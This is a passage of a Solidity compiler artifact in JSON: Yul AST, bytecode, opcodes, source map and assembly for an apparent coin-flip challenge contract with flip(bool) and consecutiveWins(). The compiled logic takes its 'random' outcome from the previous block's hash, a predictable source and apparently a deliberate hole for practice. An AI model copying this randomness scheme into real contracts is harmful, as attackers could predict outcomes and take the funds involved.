																		"nodeType": "YulLiteral",
																		"src": "2649:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2639:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2639:12:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2639:12:1"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nodeType": "YulFunctionDefinition",
												"src": "2540:117:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2703:76:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2757:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2766:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2769:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "2759:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2759:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2759:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "2726:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "2748:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nodeType": "YulIdentifier",
																					"src": "2733:14:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "2733:21:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "2723:2:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2723:32:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2716:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2716:40:1"
															},
															"nodeType": "YulIf",
															"src": "2713:60:1"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2696:5:1",
														"type": ""
													}
												],
												"src": "2663:116:1"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_bool(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function increment_t_uint256(value) -> ret {\n        value := cleanup_t_uint256(value)\n        if eq(value, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) { panic_error_0x11() }\n        ret := add(value, 1)\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c80631d263f671461003b578063e6f334d71461006b575b600080fd5b6100556004803603810190610050919061013b565b610089565b6040516100629190610186565b60405180910390f35b610073610120565b60405161008091906101a1565b60405180910390f35b60008060014361009991906101ed565b4060001c90508060015414156100ae57600080fd5b806001819055506000600254826100c591906101bc565b90506000600182146100d85760006100db565b60015b9050841515811515141561010c576000808154809291906100fb90610237565b91905055506001935050505061011b565b60008081905550600093505050505b919050565b60005481565b600081359050610135816102e3565b92915050565b600060208284031215610151576101506102de565b5b600061015f84828501610126565b91505092915050565b61017181610221565b82525050565b6101808161022d565b82525050565b600060208201905061019b6000830184610168565b92915050565b60006020820190506101b66000830184610177565b92915050565b60006101c78261022d565b91506101d28361022d565b9250826101e2576101e16102af565b5b828204905092915050565b60006101f88261022d565b91506102038361022d565b92508282101561021657610215610280565b5b828203905092915050565b60008115159050919050565b6000819050919050565b60006102428261022d565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82141561027557610274610280565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600080fd5b6102ec81610221565b81146102f757600080fd5b5056fea26469706673582212201bb0732535f19ca6de5519d59c0237b8bdd35d34af2d48d56f0a4eeba4ea8bb264736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x6B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x13B JUMP JUMPDEST PUSH2 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x186 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH2 0x120 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x80 SWAP2 SWAP1 PUSH2 0x1A1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x1 NUMBER PUSH2 0x99 SWAP2 SWAP1 PUSH2 0x1ED JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0xAE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x2 SLOAD DUP3 PUSH2 0xC5 SWAP2 SWAP1 PUSH2 0x1BC JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xD8 JUMPI PUSH1 0x0 PUSH2 0xDB JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO EQ ISZERO PUSH2 0x10C JUMPI PUSH1 0x0 DUP1 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0xFB SWAP1 PUSH2 0x237 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x11B JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x135 DUP2 PUSH2 0x2E3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x151 JUMPI PUSH2 0x150 PUSH2 0x2DE JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x15F DUP5 DUP3 DUP6 ADD PUSH2 0x126 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x171 DUP2 PUSH2 0x221 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x180 DUP2 PUSH2 0x22D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x19B PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x168 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1B6 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x177 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1C7 DUP3 PUSH2 0x22D JUMP JUMPDEST SWAP2 POP PUSH2 0x1D2 DUP4 PUSH2 0x22D JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x1E2 JUMPI PUSH2 0x1E1 PUSH2 0x2AF JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F8 DUP3 PUSH2 0x22D JUMP JUMPDEST SWAP2 POP PUSH2 0x203 DUP4 PUSH2 0x22D JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x216 JUMPI PUSH2 0x215 PUSH2 0x280 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x242 DUP3 PUSH2 0x22D JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 EQ ISZERO PUSH2 0x275 JUMPI PUSH2 0x274 PUSH2 0x280 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2EC DUP2 PUSH2 0x221 JUMP JUMPDEST DUP2 EQ PUSH2 0x2F7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SHL 0xB0 PUSH20 0x2535F19CA6DE5519D59C0237B8BDD35D34AF2D48 0xD5 PUSH16 0xA4EEBA4EA8BB264736F6C6343000807 STOP CALLER ",
							"sourceMap": "115:691:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;356:447;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;140:30;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;356:447;399:4;412:18;466:1;451:12;:16;;;;:::i;:::-;441:27;433:36;;412:57;;494:10;482:8;;:22;478:53;;;515:8;;;478:53;550:10;539:8;:21;;;;567:16;599:6;;586:10;:19;;;;:::i;:::-;567:38;;612:9;636:1;624:8;:13;:28;;647:5;624:28;;;640:4;624:28;612:40;;673:6;665:14;;:4;:14;;;661:137;;;690:15;;:17;;;;;;;;;:::i;:::-;;;;;;723:4;716:11;;;;;;;661:137;768:1;750:15;:19;;;;785:5;778:12;;;;;356:447;;;;:::o;140:30::-;;;;:::o;7:133:1:-;50:5;88:6;75:20;66:29;;104:30;128:5;104:30;:::i;:::-;7:133;;;;:::o;146:323::-;202:6;251:2;239:9;230:7;226:23;222:32;219:119;;;257:79;;:::i;:::-;219:119;377:1;402:50;444:7;435:6;424:9;420:22;402:50;:::i;:::-;392:60;;348:114;146:323;;;;:::o;475:109::-;556:21;571:5;556:21;:::i;:::-;551:3;544:34;475:109;;:::o;590:118::-;677:24;695:5;677:24;:::i;:::-;672:3;665:37;590:118;;:::o;714:210::-;801:4;839:2;828:9;824:18;816:26;;852:65;914:1;903:9;899:17;890:6;852:65;:::i;:::-;714:210;;;;:::o;930:222::-;1023:4;1061:2;1050:9;1046:18;1038:26;;1074:71;1142:1;1131:9;1127:17;1118:6;1074:71;:::i;:::-;930:222;;;;:::o;1239:185::-;1279:1;1296:20;1314:1;1296:20;:::i;:::-;1291:25;;1330:20;1348:1;1330:20;:::i;:::-;1325:25;;1369:1;1359:35;;1374:18;;:::i;:::-;1359:35;1416:1;1413;1409:9;1404:14;;1239:185;;;;:::o;1430:191::-;1470:4;1490:20;1508:1;1490:20;:::i;:::-;1485:25;;1524:20;1542:1;1524:20;:::i;:::-;1519:25;;1563:1;1560;1557:8;1554:34;;;1568:18;;:::i;:::-;1554:34;1613:1;1610;1606:9;1598:17;;1430:191;;;;:::o;1627:90::-;1661:7;1704:5;1697:13;1690:21;1679:32;;1627:90;;;:::o;1723:77::-;1760:7;1789:5;1778:16;;1723:77;;;:::o;1806:233::-;1845:3;1868:24;1886:5;1868:24;:::i;:::-;1859:33;;1914:66;1907:5;1904:77;1901:103;;;1984:18;;:::i;:::-;1901:103;2031:1;2024:5;2020:13;2013:20;;1806:233;;;:::o;2045:180::-;2093:77;2090:1;2083:88;2190:4;2187:1;2180:15;2214:4;2211:1;2204:15;2231:180;2279:77;2276:1;2269:88;2376:4;2373:1;2366:15;2400:4;2397:1;2390:15;2540:117;2649:1;2646;2639:12;2663:116;2733:21;2748:5;2733:21;:::i;:::-;2726:5;2723:32;2713:60;;2769:1;2766;2759:12;2713:60;2663:116;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "163200",
								"executionCost": "27328",
								"totalCost": "190528"
							},
							"external": {
								"consecutiveWins()": "2429",
								"flip(bool)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 115,
									"end": 806,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 115,
									"end": 806,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 115,
									"end": 806,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 213,
									"end": 290,
									"name": "PUSH",
									"source": 0,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 196,
									"end": 290,
									"name": "PUSH",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 196,
									"end": 290,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 297,
									"end": 350,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 297,
									"end": 350,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 297,
									"end": 350,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 297,
									"end": 350,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 297,
									"end": 350,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 297,
									"end": 350,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 297,
									"end": 350,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 297,
									"end": 350,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 297,
									"end": 350,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 297,
									"end": 350,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 297,
									"end": 350,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 343,
									"end": 344,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 325,
									"end": 340,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 325,
									"end": 344,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 325,
									"end": 344,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 325,
									"end": 344,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 325,
									"end": 344,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 115,
									"end": 806,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 115,
									"end": 806,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 115,
									"end": 806,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 115,
									"end": 806,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 115,
									"end": 806,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 115,
									"end": 806,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 115,
									"end": 806,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212201bb0732535f19ca6de5519d59c0237b8bdd35d34af2d48d56f0a4eeba4ea8bb264736f6c63430008070033",
									".code": [
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "1D263F67"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "E6F334D7"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 399,
											"end": 403,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 412,
											"end": 430,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 467,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 451,
											"end": 463,
											"name": "NUMBER",
											"source": 0
										},
										{
											"begin": 451,
											"end": 467,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 451,
											"end": 467,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 451,
											"end": 467,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 451,
											"end": 467,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 451,
											"end": 467,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 451,
											"end": 467,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 451,
											"end": 467,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 441,
											"end": 468,
											"name": "BLOCKHASH",
											"source": 0
										},
										{
											"begin": 433,
											"end": 469,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 433,
											"end": 469,
